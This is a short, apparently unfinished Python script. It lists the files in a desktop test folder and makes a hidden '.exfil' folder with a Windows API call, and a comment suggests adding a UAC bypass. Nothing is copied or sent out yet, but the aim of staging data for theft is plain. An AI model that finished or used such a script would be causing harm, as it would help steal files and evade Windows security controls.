import shutil
import os
import asyncio
import ctypes

# test dir
directory = "C:/Users/jgwfl/OneDrive/Desktop/test_dir"

#file paths
files = []

def iterate_files(directory):

    #scan dir for object
    for obj in os.scandir(directory):
        #check if obj is file
        if obj.is_file():
            #append obj filepath to files
            files.append((obj.path).replace("\\", "/"))

    create_hidden_dir(directory)

def create_hidden_dir(directory):

    #join exfil folder to path
    exfil = os.path.join(directory, ".exfil")

    try:
        #make exfil folder
        os.mkdir(exfil)
        #if os is windows
        if os.name == "nt":
            #set file property to hidden
            ctypes.windll.kernel32.SetFileAttributesW(ctypes.c_wchar_p(exfil), 0x02)
        print(exfil.replace("\\", "/"))
        return exfil
    except FileExistsError:
        print("File exists...Continuing")
        pass
    except PermissionError:
        print("Permissions Denied:")
        #implement UAC bypassing?
    except Exception as e:
        print(f"Error, {e}")
    

   


iterate_files(directory)